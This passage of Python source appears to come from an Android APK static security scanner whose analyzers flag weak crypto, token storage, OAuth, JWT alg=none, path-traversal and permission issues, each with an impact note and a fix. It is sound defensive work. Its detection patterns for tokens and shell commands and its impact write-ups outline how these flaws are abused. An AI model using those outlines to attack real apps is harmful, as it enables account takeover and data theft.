            evidence=", ".join(suspicious[:10]),
            recommendation="Audit each usage. Avoid shell commands; use platform APIs.",
            masvs="MSTG-RESILIENCE-2",
            confidence="confirmed", source="mobsf",
        ))
    return f


EXTENDED_ANALYZERS_2 = [
    ("trackers",                    analyze_trackers),
    ("urls-ips-emails",             analyze_urls_ips_emails),
    ("firebase-databases",          analyze_firebase_db),
    ("s3-buckets",                  analyze_s3_buckets),
    ("webview-addjs-iface",         analyze_webview_addjs_interface),
    ("signing-info",                analyze_signing_schemes),
    ("excessive-logging",           analyze_debug_logging),
    ("sqlite-encryption",           analyze_sqlcipher),
    ("path-traversal",              analyze_path_traversal),
    ("basic-auth",                  analyze_basic_auth),
    ("device-id-collection",        analyze_device_id_collection),
    ("http-client-inventory",       analyze_http_clients_inventory),
    ("webview-save-pwd",            analyze_webview_save_pwd),
    ("cleartext-urls",              analyze_no_https),
    ("filter-touches",              analyze_filter_touches),
    ("provider-permissions",        analyze_provider_permissions),
    ("manifest-extras",             analyze_manifest_extras),
    ("keystore-usage",              analyze_keystore_usage),
    ("screen-recording",            analyze_screen_recording),
    ("dynamic-broadcasts",          analyze_dynamic_broadcasts),
    ("weak-tls",                    analyze_tls_versions),
    ("clipboard",                   analyze_clipboard),
    ("shell-commands",              analyze_shell_commands),
]
EXTENDED_ANALYZERS = [
    ("task-hijacking",                   analyze_task_hijacking),
    ("open-redirect-deeplink",           analyze_open_redirect_via_deeplink),
    ("intent-redirection",               analyze_intent_redirection),
    ("fileprovider-paths",               analyze_fileprovider_paths),
    ("grant-uri-setresult",              analyze_grant_uri_permission_setresult),
    ("webview-file-access",              analyze_webview_file_access),
    ("webview-js-bridge",                analyze_webview_js_bridge),
    ("webview-mixed-content",            analyze_webview_mixed_content),
    ("webview-ssl-error-handler",        analyze_webview_ssl_error_handler),
    ("webview-dom-storage",              analyze_webview_dom_storage),
    ("webview-savepassword",             analyze_webview_save_password),
    ("pendingintent-mutable",            analyze_pendingintent_mutable),
    ("janus",                            analyze_janus),
    ("sql-injection",                    analyze_sql_injection_db),
    ("sql-string-concat",                analyze_sql_format_concat),
    ("runtime-exec",                     analyze_runtime_exec),
    ("dynamic-code-loading",             analyze_dynamic_code_loading),
    ("world-mode-storage",               analyze_world_mode_storage),
    ("external-storage",                 analyze_external_storage),
    ("insecure-logging",                 analyze_insecure_logging),
    ("custom-permissions",               analyze_custom_permissions),
    ("dangerous-perms",                  analyze_dangerous_perms),
    ("biometric-misuse",                 analyze_biometric_misuse),
    ("flag-secure",                      analyze_flag_secure),
    ("obfuscation",                      analyze_obfuscation),
    ("hostname-verifier",                analyze_hostname_verifier),
    ("deserialization",                  analyze_deserialization),
    ("zip-slip",                         analyze_zip_slip),
    ("broadcast-receivers",              analyze_unprotected_broadcasts),
    ("implicit-intents",                 analyze_implicit_intents),
    ("cleartext-traffic",                analyze_cleartext_traffic),
    ("allow-backup-explicit",            analyze_allow_backup_explicit),
    ("debuggable-explicit",              analyze_debuggable_explicit),
    ("weak-random",                      analyze_weak_random),
    ("trustmanager-trust-all",           analyze_trust_all_certs),
    ("network-security-config",          analyze_network_security_config),
    ("backup-rules",                     analyze_backup_rules),
    ("hardcoded-urls",                   analyze_hardcoded_urls),
    ("base64-blobs",                     analyze_base64_blobs),
    ("firebase-config",                  analyze_firebase_config),
    ("tapjacking",                       analyze_tapjacking),
    ("root-detection",                   analyze_root_detection),
    ("emulator-detection",               analyze_emulator_detection),
    ("anti-hooking",                     analyze_anti_hooking),
    ("native-lib-protections",           analyze_native_lib_protections),
    ("resource-secrets",                 analyze_resource_secrets),
    ("http-clients",                     analyze_http_clients),
    ("reflection-usage",                 analyze_reflection),
    ("keyboard-cache",                   analyze_keyboard_cache),
    ("known-vuln-libs",                  analyze_known_vuln_libs),
    ("clipboard-usage",                  analyze_clipboard_usage),
]


# =============================================================================
# EXTENDED_ANALYZERS_3 — High-value bug classes commonly missed by static tools.
# Added in the polish pass to expand real-world coverage.
# =============================================================================

def analyze_static_iv(ctx: Ctx) -> list:
    """Detect probable static IV usage in AES/CBC: new IvParameterSpec(<constant>).
    Static IVs in CBC mode allow attackers to determine if two ciphertexts have
    the same plaintext prefix (chosen-plaintext attack)."""
    f = []
    strings = _get_strings(ctx)
    has_ivparam = any("IvParameterSpec" in s for s in strings)
    has_cbc = any("AES/CBC" in s or "DES/CBC" in s for s in strings)
    has_cipher = any(s == "javax.crypto.Cipher" or "Cipher;" in s for s in strings)
    if has_ivparam and (has_cbc or has_cipher):
        # Look for byte-array literal patterns near IvParameterSpec
        evidence = next((s for s in strings if "IvParameterSpec" in s), "IvParameterSpec usage detected")
        f.append(Finding(
            id="static-iv-suspect",
            title="Possible static / hardcoded IV in AES/CBC",
            severity="high", category="MASVS-CRYPTO",
            description="App uses IvParameterSpec, indicating manual IV management. Combined with "
                        "CBC mode, a static or predictable IV enables chosen-plaintext attacks and "
                        "leaks information about plaintext prefixes.",
            evidence=f"DEX strings reference IvParameterSpec + CBC: {evidence[:120]}",
            recommendation="Always use a fresh, cryptographically random IV (SecureRandom.getInstanceStrong()). "
                           "Better: switch to AES-GCM which authenticates and uses a 96-bit nonce per encryption.",
            cwe="CWE-329", masvs="MSTG-CRYPTO-3",
            cvss=7.5,
            impact="Attacker can verify guessed plaintexts and detect duplicate plaintexts -- "
                   "useful in side-channel attacks against tokens, passwords, structured data.",
            fix=("1) Generate IV: byte[] iv = new byte[16]; SecureRandom.getInstanceStrong().nextBytes(iv);\n"
                 "2) Prepend IV to ciphertext (it is not secret).\n"
                 "3) Migrate to AES-GCM with 96-bit random nonces.\n"
                 "4) NEVER reuse an IV across encryptions with the same key."),
            references=[
                "https://cwe.mitre.org/data/definitions/329.html",
                "https://owasp.org/www-project-mobile-app-security/MASVS/Controls/MASVS-CRYPTO-3/",
            ],
            confidence="likely",
        ))
    return f


def analyze_hardcoded_salt(ctx: Ctx) -> list:
    """Detect PBKDF2/scrypt with hardcoded salt -- defeats KDF entirely."""
    f = []
    strings = _get_strings(ctx)
    kdf_used = any(k in s for s in strings for k in
                   ("PBKDF2WithHmacSHA1", "PBKDF2WithHmacSHA256", "PBEKeySpec", "scrypt", "bcrypt"))
    if not kdf_used:
        return f
    # Look for byte-array constants likely used as salt -- short hex strings or literal bytes
    salt_hint = any(re.search(r'(?i)\bsalt\b\s*[:=]\s*["\']', s) for s in strings if len(s) < 200)
    has_pbespec = any("PBEKeySpec" in s for s in strings)
    if has_pbespec or salt_hint:
        f.append(Finding(
            id="hardcoded-salt",
            title="Possible hardcoded salt for KDF (PBKDF2 / scrypt)",
            severity="high", category="MASVS-CRYPTO",
            description="Hardcoded salts in password-based key derivation defeat the salt's purpose. "
                        "An attacker who extracts the salt can pre-compute rainbow tables for all users "
                        "of the app simultaneously.",
            evidence="DEX references PBEKeySpec/PBKDF2 along with salt-named constants",
            recommendation="Generate a random per-user salt with SecureRandom. Store it alongside the derived key/hash.",
            cwe="CWE-760", masvs="MSTG-CRYPTO-3",
            cvss=7.5,
            impact="Pre-computed rainbow tables become viable. Mass user-credential cracking after one extraction.",
            fix=("1) byte[] salt = new byte[16]; SecureRandom.getInstanceStrong().nextBytes(salt);\n"
                 "2) Persist the salt alongside the key/hash.\n"
                 "3) Use >= 600,000 iterations for PBKDF2-HMAC-SHA256 (OWASP 2023).\n"
                 "4) Prefer Argon2id over PBKDF2 if available (Tink library)."),
            references=[
                "https://cwe.mitre.org/data/definitions/760.html",
                "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html",
            ],
            confidence="likely",
        ))
    return f


def analyze_jwt_in_prefs(ctx: Ctx) -> list:
    """Detect JWT or bearer tokens being stored in SharedPreferences (very common vuln)."""
    f = []
    strings = _get_strings(ctx)
    uses_prefs = any(s in ("getSharedPreferences", "PreferenceManager", "SharedPreferences")
                     or "SharedPreferences;" in s for s in strings)
    has_jwt_key = any(re.search(r'(?i)\b(jwt|access[_\-]?token|refresh[_\-]?token|bearer|auth[_\-]?token|id[_\-]?token)\b', s)
                      for s in strings if 0 < len(s) < 80)
    has_putString = any("putString" in s for s in strings)
    if uses_prefs and has_jwt_key and has_putString:
        sample = next((s for s in strings if 0 < len(s) < 80
                       and re.search(r'(?i)\b(jwt|access[_\-]?token|refresh[_\-]?token|bearer)\b', s)),
                      "token-related preference key")
        f.append(Finding(
            id="jwt-in-prefs",
            title="Auth token (JWT/bearer) likely stored in SharedPreferences",
            severity="high", category="MASVS-STORAGE",
            description="SharedPreferences stores data unencrypted (XML in /data/data/<pkg>/shared_prefs). "
                        "On rooted devices or via adb backup (when allowBackup=true), tokens are "
                        "trivially extractable.",
            evidence=f"DEX references SharedPreferences + token-named keys: '{sample}'",
            recommendation="Store auth tokens in EncryptedSharedPreferences (AndroidX Security) "
                           "or the Android Keystore.",
            cwe="CWE-922", masvs="MSTG-STORAGE-1",
            cvss=7.1,
            impact="Stolen device or backup -> full session takeover. Silent token exfiltration "
                   "by any other app with READ_EXTERNAL_STORAGE on pre-Android-11 devices.",
            fix=("1) Replace SharedPreferences with EncryptedSharedPreferences:\n"
                 "   MasterKey key = new MasterKey.Builder(ctx).setKeyScheme(AES256_GCM).build();\n"
                 "   EncryptedSharedPreferences.create(ctx, \"prefs\", key, AES256_SIV, AES256_GCM);\n"
                 "2) Better: store only short-lived access tokens; use Keystore-backed refresh tokens.\n"
                 "3) Set android:allowBackup=\"false\" or exclude shared_prefs from the backup rules."),
            references=[
                "https://developer.android.com/topic/security/data",
                "https://cwe.mitre.org/data/definitions/922.html",
            ],
            confidence="likely",
        ))
    return f


def analyze_predictable_token_rng(ctx: Ctx) -> list:
    """Detect non-cryptographic RNG (Random, Math.random) used near token/session/UUID generation."""
    f = []
    strings = _get_strings(ctx)
    weak_rng = [s for s in strings
                if ("java.util.Random" in s or "Math.random" in s or "ThreadLocalRandom" in s)
                and "SecureRandom" not in s]
    has_token_context = any(re.search(r'(?i)\b(token|session|nonce|otp|csrf|verifier|challenge)\b', s)
                            for s in strings if 0 < len(s) < 100)
    if weak_rng and has_token_context:
        f.append(Finding(
            id="weak-rng-token",
            title="Non-cryptographic RNG used in security context",
            severity="high", category="MASVS-CRYPTO",
            description="java.util.Random and Math.random() use a 48-bit linear congruential generator. "
                        "Given two consecutive outputs, all future outputs are predictable. Used for "
                        "tokens, OTPs, or nonces, this is exploitable.",
            evidence=f"Random usage + token/session/OTP keywords detected: {weak_rng[0][:120]}",
            recommendation="Use SecureRandom.getInstanceStrong() for any value used as a credential, token, IV, salt, or nonce.",
            cwe="CWE-338", masvs="MSTG-CRYPTO-6",
            cvss=7.5,
            impact="Token / OTP / CSRF prediction. Account takeover via guessable session identifiers.",
            fix=("1) SecureRandom rng = SecureRandom.getInstanceStrong();\n"
                 "2) byte[] token = new byte[32]; rng.nextBytes(token);\n"
                 "3) Encode with Base64.URL_SAFE for transmission.\n"
                 "4) Audit all callers of Random/Math.random in security paths."),
            references=[
                "https://cwe.mitre.org/data/definitions/338.html",
                "https://owasp.org/www-project-mobile-app-security/MASVS/Controls/MASVS-CRYPTO-6/",
            ],
            confidence="likely",
        ))
    return f


def analyze_cipher_no_padding(ctx: Ctx) -> list:
    """Detect Cipher.getInstance("AES") without explicit mode/padding.
    Tight version: requires (a) Cipher class is actually loaded, (b) bare "AES" or "DES" appears
    as an exact string, (c) NO qualified transformation like AES/CBC/PKCS5Padding appears.
    All three conditions must hold to flag, and we still mark this as 'possible' confidence."""
    f = []
    strings = _get_strings(ctx)

    # (a) Is the Cipher class even used?
    cipher_used = any("Ljavax/crypto/Cipher;" in s or s == "javax.crypto.Cipher" for s in strings)
    if not cipher_used:
        return f

    # (b) Literal bare "AES" or "DES" -- but ONLY if also no qualified form
    bare_algos = {s for s in strings if s in ("AES", "DES", "DESede", "RSA")}
    if not bare_algos:
        return f

    # (c) Suppress if any qualified form exists ANYWHERE in the strings
    has_qualified = any(re.match(r"^(AES|DES|DESede|RSA)/[A-Za-z0-9]+/[A-Za-z0-9]+$", s)
                        for s in strings)
    if has_qualified:
        return f

    # All conditions met -- but still ship as 'possible' confidence
    f.append(Finding(
        id="cipher-no-mode",
        title="Cipher.getInstance() may be called without explicit mode/padding",
        severity="medium", category="MASVS-CRYPTO",
        description="Cipher.getInstance(\"AES\") with no transformation suffix uses the provider's "
                    "default mode and padding. On most Android versions this defaults to ECB, which "
                    "leaks plaintext patterns.",
        evidence=f"Cipher class loaded; bare algorithm string(s) present: {sorted(bare_algos)}; "
                 f"no qualified AES/MODE/PADDING string found in DEX",
        recommendation="Always specify the full transformation: \"AES/GCM/NoPadding\" or \"AES/CBC/PKCS5Padding\".",
        cwe="CWE-327", masvs="MSTG-CRYPTO-4",
        cvss=5.9,
        impact="ECB-mode encryption leaks plaintext structure (ECB penguin). "
               "Detectable via repeating ciphertext blocks. Verify by decompiling and inspecting "
               "the actual Cipher.getInstance() call site.",
        fix=("1) Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");  // authenticated\n"
             "2) Or Cipher.getInstance(\"AES/CBC/PKCS5Padding\") with explicit IV.\n"
             "3) Audit every Cipher.getInstance() call site."),
        references=[
            "https://cwe.mitre.org/data/definitions/327.html",
            "https://developer.android.com/reference/javax/crypto/Cipher#getInstance(java.lang.String)",
        ],
        confidence="possible",
    ))
    return f


def analyze_dirty_stream(ctx: Ctx) -> list:
    """Detect Dirty Stream attack vector (CVE-2024-0044): ContentProvider.openFile() patterns
    where the input filename from a foreign app is concatenated into a path without
    checking for traversal sequences."""
    f = []
    strings = _get_strings(ctx)
    has_provider = any("ContentProvider" in s for s in strings)
    has_open_file = any("openFile" in s or "openAssetFile" in s for s in strings)
    has_path_concat = any(s in ("getLastPathSegment", "getQueryParameter") for s in strings)
    has_canonical = any("getCanonicalPath" in s or "toRealPath" in s for s in strings)
    if has_provider and has_open_file and has_path_concat and not has_canonical:
        f.append(Finding(
            id="dirty-stream",
            title="Possible Dirty Stream content-provider vulnerability",
            severity="high", category="MASVS-PLATFORM",
            description="ContentProvider exposes openFile()/openAssetFile() and reads the requested "
                        "filename from the URI without canonical-path validation. An attacker app can "
                        "send a URI containing '../' segments to write/read outside the intended directory "
                        "-- code-execution or data-theft pattern documented as 'Dirty Stream'.",
            evidence="ContentProvider + openFile + getLastPathSegment/getQueryParameter, no canonical path validation",
            recommendation="Validate the resolved File against the intended root using getCanonicalPath() startsWith(rootDir).",
            cwe="CWE-22", masvs="MSTG-PLATFORM-3",
            cve="CVE-2024-0044",
            cvss=7.8,
            impact="Cross-app file write -> code injection if attacker writes to shared paths reachable by the app's loader. "
                   "Cross-app file read -> theft of internal app data via crafted URIs.",
            fix=("1) File target = new File(rootDir, name).getCanonicalFile();\n"
                 "2) if (!target.toPath().startsWith(rootDir.toPath())) throw new SecurityException();\n"
                 "3) Reject names containing '..' or absolute paths early.\n"
                 "4) Set android:exported=\"false\" on the provider when third-party access is not needed."),
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-0044",
                "https://www.microsoft.com/en-us/security/blog/2024/05/01/dirty-stream-attack-discovering-and-mitigating-a-common-vulnerability-pattern-in-android-apps/",
            ],
            confidence="likely",
        ))
    return f


def analyze_oauth_redirect(ctx: Ctx) -> list:
    """Detect deep-link handlers that read 'redirect_uri' / 'state' from the URI without validation
    -- common OAuth 2.0 flaw enabling token theft via crafted intent."""
    f = []
    deeplinks = ctx.extras.get("deeplinks", []) if ctx.extras else []
    if not deeplinks:
        return f
    strings = _get_strings(ctx)
    has_redirect_uri = any(re.search(r'(?i)redirect[_\-]?uri', s) for s in strings if 0 < len(s) < 100)
    has_oauth_token = any(re.search(r'(?i)\b(access[_\-]?token|authorization[_\-]?code|state)\b', s)
                          for s in strings if 0 < len(s) < 100)
    has_validation = any(re.search(r'(?i)(allow[_\-]?list|whitelist|verify[_\-]?host|isValidRedirect)', s)
                         for s in strings if 0 < len(s) < 100)
    if has_redirect_uri and has_oauth_token and not has_validation:
        f.append(Finding(
            id="oauth-redirect-unvalidated",
            title="OAuth deep-link handler accepts redirect_uri without validation",
            severity="high", category="MASVS-AUTH",
            description="App handles deep links containing OAuth parameters (redirect_uri, state, "
                        "access_token) but no allowlist / verification logic was found. "
                        "Attacker can craft a deep link that redirects the auth code to an attacker server.",
            evidence=f"Deep links present + OAuth keywords found, no redirect-validation strings detected",
            recommendation="Compare incoming redirect_uri against a strict allowlist of registered URIs before accepting any token.",
            cwe="CWE-601", masvs="MSTG-AUTH-2",
            cvss=7.5,
            impact="Authorization code / access token leak -> account takeover.",
            fix=("1) Maintain a strict allowlist of valid redirect URIs (host + path + scheme).\n"
                 "2) Validate redirect_uri matches a registered value EXACTLY before processing.\n"
                 "3) Use PKCE (Proof Key for Code Exchange) for public mobile clients.\n"
                 "4) Bind state parameter to the originating request and verify on callback."),
            references=[
                "https://cwe.mitre.org/data/definitions/601.html",
                "https://datatracker.ietf.org/doc/html/rfc8252",
            ],
            confidence="likely",
        ))
    return f


def analyze_strict_mode(ctx: Ctx) -> list:
    """Detect StrictMode used in production builds (info-level finding -- can cause crashes/leaks)."""
    f = []
    strings = _get_strings(ctx)
    enabled = any("StrictMode" in s and ("setThreadPolicy" in s or "setVmPolicy" in s)
                  for s in strings)
    if enabled:
        # StrictMode enabled in shipped APK is unusual -- typically dev-only
        try:
            debuggable = ctx.apk.get_element("application", "debuggable")
        except Exception:
            debuggable = None
        if debuggable != "true":
            f.append(Finding(
                id="strict-mode-prod",
                title="StrictMode active in non-debuggable build",
                severity="info", category="MASVS-RESILIENCE",
                description="StrictMode is intended for development. Enabled in production it can crash "
                            "the app on policy violations (penaltyDeath) or log internal stack traces.",
                evidence="StrictMode.setThreadPolicy / setVmPolicy detected; debuggable != true",
                recommendation="Gate StrictMode behind BuildConfig.DEBUG.",
                cwe="CWE-489", masvs="MSTG-RESILIENCE-2",
                cvss=2.7,
                impact="Possible runtime crashes, internal information disclosure via policy violation logs.",
                fix=("if (BuildConfig.DEBUG) { StrictMode.setThreadPolicy(...); }"),
                references=["https://developer.android.com/reference/android/os/StrictMode"],
                confidence="possible",
            ))
    return f


EXTENDED_ANALYZERS_3 = [
    ("static-iv",                        analyze_static_iv),
    ("hardcoded-salt",                   analyze_hardcoded_salt),
    ("jwt-in-prefs",                     analyze_jwt_in_prefs),
    ("predictable-token-rng",            analyze_predictable_token_rng),
    ("cipher-no-padding",                analyze_cipher_no_padding),
    ("dirty-stream",                     analyze_dirty_stream),
    ("oauth-redirect-unvalidated",       analyze_oauth_redirect),
    ("strict-mode-prod",                 analyze_strict_mode),
]


# =============================================================================
# Path-2 expansion (MASVS-AUTH / PRIVACY / RESILIENCE / NETWORK / CODE).
# Each analyzer adds genuinely-new detection, not a rename of an existing one.
# All ship with `possible` or `likely` confidence unless the signal is unambiguous.
# =============================================================================

# ---------- MASVS-AUTH ----------

def analyze_jwt_alg_none(ctx: Ctx) -> list:
    """Detect JWT libraries configured to accept alg=none (CVE-class: signature bypass).
    Signal: app references com.auth0.jwt or io.jsonwebtoken AND sets verify=false / NONE."""
    f = []
    s = _get_strings(ctx)
    has_jwt_lib = any(x in s for x in (
        "Lcom/auth0/jwt/", "Lio/jsonwebtoken/", "Lcom/nimbusds/jwt/"))
    if not has_jwt_lib:
        return f
    indicators = [x for x in s if x in (
        "alg", "none", "NONE", "alg=none",
        "setAllowedClockSkewSeconds", "setSigningKey")]
    has_none = any(x == "none" or x == "NONE" or "alg=none" in x for x in s)
    if has_jwt_lib and has_none:
        f.append(Finding(
            id="jwt-alg-none-accepted",
            title="JWT library may accept unsigned tokens (alg=none)",
            severity="high", category="MASVS-AUTH",
            description=("App imports a JWT library and contains the literal "
                         "'none' algorithm string. Many libraries accept alg=none "
                         "by default if the verifier is misconfigured -- attackers "
                         "can forge any token with no signature."),
            evidence=f"JWT lib + 'none' algorithm string present in DEX",
            recommendation=("Always set the expected algorithm explicitly "
                            "(HS256/RS256). Reject tokens with alg=none. "
                            "Use Algorithm.HMAC256(key) and verify().withIssuer(...).build()."),
            cwe="CWE-347", masvs="MSTG-AUTH-3", cvss=8.1,
            references=[
                "https://cwe.mitre.org/data/definitions/347.html",
                "https://www.howmanydayssinceajwtalgnonevuln.com/",
            ],
            confidence="possible",
        ))
    return f


def analyze_pin_min_length(ctx: Ctx) -> list:
    """Detect PIN entry that allows 4-digit codes -- generally too weak.
    Signal: TextInputLayout/EditText with maxLength=4 + numeric inputType + 'pin' in id/label."""
    f = []
    apk = ctx.apk
    if apk is None: return f
    try:
        # Check XML resources for PIN-style fields
        import re as _re
        from androguard.core.bytecodes import axml as _axml  # noqa
    except Exception:
        return f
    found_4digit_pin = False
    evidence_loc = ""
    try:
        for res in apk.get_files():
            if not res.startswith("res/layout/") or not res.endswith(".xml"):
                continue
            try:
                content = apk.get_file(res)
                # Best-effort substring check on parsed AXML
                xml = _axml.AXMLPrinter(content).get_xml()
                if isinstance(xml, bytes): xml = xml.decode("utf-8", errors="ignore")
                if "android:maxLength=\"4\"" in xml and \
                   ("pin" in xml.lower() or "passcode" in xml.lower()) and \
                   "numberPassword" in xml:
                    found_4digit_pin = True
                    evidence_loc = res
                    break
            except Exception:
                continue
    except Exception:
        return f
    if found_4digit_pin:
        f.append(Finding(
            id="weak-pin-4-digits",
            title="PIN field accepts only 4 digits",
            severity="medium", category="MASVS-AUTH",
            description=("A layout file defines a numeric password field with "
                         "maxLength=4 and identifier suggesting it's the user's "
                         "primary PIN. 4-digit PINs offer only 10,000 possible "
                         "values, easily brute-forced if the device is unlocked."),
            evidence=f"Layout: {evidence_loc}",
            recommendation=("Require 6 digits minimum. Add server-side rate "
                            "limiting and lockout after N failed attempts."),
            cwe="CWE-521", masvs="MSTG-AUTH-6", cvss=4.3,
            references=[
                "https://cwe.mitre.org/data/definitions/521.html",
                "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf",
            ],
            confidence="likely",
        ))
    return f


def analyze_biometric_keyspec_no_user_auth(ctx: Ctx) -> list:
    """Detect KeyGenParameterSpec used WITHOUT setUserAuthenticationRequired(true).
    Common bug: keystore key is generated but biometric prompt is decorative -- key
    can be used after device unlock without re-authentication."""
    f = []
    s = _get_strings(ctx)
    has_keygen = any("KeyGenParameterSpec" in x for x in s)
    if not has_keygen:
        return f
    has_setuserauth = any("setUserAuthenticationRequired" in x for x in s)
    has_biometric_lib = any("BiometricPrompt" in x or "FingerprintManager" in x for x in s)
    if has_keygen and has_biometric_lib and not has_setuserauth:
        f.append(Finding(
            id="biometric-keyspec-no-user-auth",
            title="Keystore key generated without user-authentication binding",
            severity="medium", category="MASVS-AUTH",
            description=("App uses BiometricPrompt with a Keystore-backed key but "
                         "no call to setUserAuthenticationRequired(true) was found. "
                         "If the biometric prompt is decorative and the key isn't "
                         "bound to authentication, an attacker who already has device "
                         "unlock can use the key without re-authenticating."),
            evidence="KeyGenParameterSpec + BiometricPrompt present; "
                     "setUserAuthenticationRequired() not detected",
            recommendation=("Generate keys with "
                            "setUserAuthenticationRequired(true)"
                            ".setUserAuthenticationParameters(0, AUTH_BIOMETRIC_STRONG). "
                            "Use a CryptoObject in BiometricPrompt.authenticate() so "
                            "the authentication unlocks the key, not just the UI flow."),
            cwe="CWE-287", masvs="MSTG-AUTH-8", cvss=5.5,
            references=[
                "https://developer.android.com/training/sign-in/biometric-auth",
                "https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.Builder#setUserAuthenticationRequired(boolean)",
            ],
            confidence="possible",
        ))
    return f


def analyze_session_in_logcat(ctx: Ctx) -> list:
    """Detect Log.* calls whose arguments include session/token/auth identifiers."""
    f = []
    s = _get_strings(ctx)
    # Format strings that combine logging + an auth concept
    suspect = []
    for x in s:
        xl = x.lower()
        if 6 < len(x) < 120 and ("token" in xl or "session" in xl or "jwt" in xl
                                  or "bearer" in xl or "cookie" in xl):
            # Looks like a log format
            if any(p in x for p in ("%s", "%d", "{}", " = ", ": ")) and \
               not x.startswith("http") and "=" in x[:30] + " ":
                suspect.append(x)
    if suspect:
        # Need actual Log.* class reference too -- stronger signal
        has_log = any(y in s for y in ("Landroid/util/Log;", "Lkotlin/io/println"))
        if has_log:
            f.append(Finding(
                id="session-in-logcat",
                title="Session / token data may be written to logcat",
                severity="medium", category="MASVS-AUTH",
                description=("Log calls and format strings referencing tokens, "
                             "sessions, or auth cookies were detected. Logcat is "
                             "globally readable on older devices and on rooted "
                             "devices; logged tokens become recoverable."),
                evidence=f"Suspect format strings: {suspect[:3]}",
                recommendation=("Strip sensitive fields from log calls. Use a "
                                "release-build no-op logger (Timber + DebugTree only). "
                                "Add ProGuard rules to remove Log.d/v in release."),
                cwe="CWE-532", masvs="MSTG-STORAGE-3", cvss=4.3,
                references=[
                    "https://cwe.mitre.org/data/definitions/532.html",
                    "https://developer.android.com/topic/security/data#log-info",
                ],
                confidence="possible",
            ))
    return f


def analyze_password_reset_deeplink(ctx: Ctx) -> list:
    """Detect password-reset deeplinks that don't require a token parameter."""
    f = []
    apk = ctx.apk
    if apk is None: return f
    deeplinks = (ctx.extras or {}).get("deeplinks") or []
    for dl in deeplinks:
        uri = (dl.get("uri") or "").lower()
        if any(k in uri for k in ("reset", "forgot", "recover", "verify")):
            # Check whether the registered intent-filter has any token-like path/query
            paths = dl.get("paths") or []
            has_token_path = any("token" in p.lower() or "key" in p.lower() or "{" in p
                                 for p in paths)
            if not has_token_path:
                f.append(Finding(
                    id=f"reset-deeplink-no-token-{abs(hash(uri)) % 10000}",
                    title="Password-reset deeplink may lack token parameter",
                    severity="high", category="MASVS-AUTH",
                    description=("A deep-link path looks like a password-reset / "
                                 "verification flow but doesn't appear to require "
                                 "a single-use token in its URI structure. Reset "
                                 "links should always carry a server-issued, one-time "
                                 "token tied to the user account."),
                    evidence=f"Deep link URI: {uri}",
                    recommendation=("Embed a single-use, server-signed token in the "
                                    "URI (e.g. /reset/{token}). Validate, expire after "
                                    "use, bind to the user's email."),
                    cwe="CWE-640", masvs="MSTG-AUTH-2", cvss=7.4,
                    references=[
                        "https://cwe.mitre.org/data/definitions/640.html",
                        "https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html",
                    ],
                    confidence="possible",
                ))
    return f


# ---------- MASVS-PRIVACY ----------

def analyze_background_location(ctx: Ctx) -> list:
    """Flag ACCESS_BACKGROUND_LOCATION since Google Play requires explicit
    justification + restricts apps that hold it."""
    f = []
    apk = ctx.apk
    if apk is None: return f
    try:
        perms = apk.get_permissions() or []
    except Exception:
        return f
    if "android.permission.ACCESS_BACKGROUND_LOCATION" in perms:
        f.append(Finding(
            id="background-location-permission",
            title="App requests ACCESS_BACKGROUND_LOCATION",
            severity="medium", category="MASVS-PRIVACY",
            description=("Background location is a heavily-restricted permission. "
                         "Google Play requires explicit justification for it; many "
                         "apps that request it don't strictly need it. Storing user "
                         "location continuously is a high-impact privacy concern "
                         "and may violate GDPR/CCPA without consent + minimization."),
            evidence="manifest contains android.permission.ACCESS_BACKGROUND_LOCATION",
            recommendation=("Use foreground-service location for active sessions. "
                            "Use the geofencing API for periodic checks. Only request "
                            "background access if the core feature truly needs it; "
                            "implement the rationale UI Google Play requires."),
            cwe="CWE-359", masvs="MSTG-PLATFORM-1", cvss=4.0,
            references=[
                "https://developer.android.com/about/versions/11/privacy/location",
                "https://support.google.com/googleplay/android-developer/answer/9799150",
            ],
            confidence="confirmed",
        ))
    return f


def analyze_phone_state_for_non_telephony(ctx: Ctx) -> list:
    """READ_PHONE_STATE / READ_PHONE_NUMBERS for apps that don't appear to be telephony apps.
    Often used to harvest IMEI/IMSI for tracking."""
    f = []
    apk = ctx.apk
    if apk is None: return f
    try:
        perms = apk.get_permissions() or []
        s = _get_strings(ctx)
    except Exception:
        return f
    has_phone_perm = "android.permission.READ_PHONE_STATE" in perms or \
                     "android.permission.READ_PHONE_NUMBERS" in perms
    if not has_phone_perm:
        return f
    # Heuristic: if the app uses TelephonyManager.call/dial APIs, treat as telephony
    is_telephony_app = any(x in s for x in (
        "ACTION_DIAL", "ACTION_CALL", "tel:", "TelephonyManager.listen",
        "PhoneStateListener", "MMS_RECEIVED", "SMS_RECEIVED"))
    if not is_telephony_app:
        f.append(Finding(
            id="phone-state-non-telephony",
            title="READ_PHONE_STATE requested without telephony features",
            severity="medium", category="MASVS-PRIVACY",
            description=("READ_PHONE_STATE grants access to IMEI, IMSI, and the "
                         "device's phone number. The app requests it but doesn't "
                         "appear to use telephony APIs (call, SMS, MMS). Common "
                         "pattern when used for device fingerprinting / tracking."),
            evidence="Permission present; no TelephonyManager usage detected",
            recommendation=("Remove the permission. For ad-tracking, use the "
                            "Advertising ID with consent. For device-instance "
                            "identifiers, use ANDROID_ID or AppSet ID instead."),
            cwe="CWE-359", masvs="MSTG-PLATFORM-1", cvss=4.3,
            references=[
                "https://developer.android.com/training/articles/user-data-ids",
                "https://developer.android.com/about/versions/10/privacy/changes#non-resettable-device-ids",
            ],
            confidence="likely",
        ))
    return f


def analyze_query_all_packages(ctx: Ctx) -> list:
    """QUERY_ALL_PACKAGES on Android 11+ is heavily restricted by Google Play."""
    f = []
    apk = ctx.apk
    if apk is None: return f
    try:
        perms = apk.get_permissions() or []
    except Exception:
        return f
    if "android.permission.QUERY_ALL_PACKAGES" in perms:
        f.append(Finding(
            id="query-all-packages",
            title="App holds QUERY_ALL_PACKAGES",
            severity="medium", category="MASVS-PRIVACY",
            description=("QUERY_ALL_PACKAGES allows an app to enumerate every "
                         "installed application -- a common signal for fingerprinting "
                         "and competitor research. Google Play heavily restricts "
                         "this permission to specific app categories (anti-virus, "
                         "device management, browsers)."),
            evidence="manifest contains android.permission.QUERY_ALL_PACKAGES",
            recommendation=("Use a <queries> block with specific package names or "
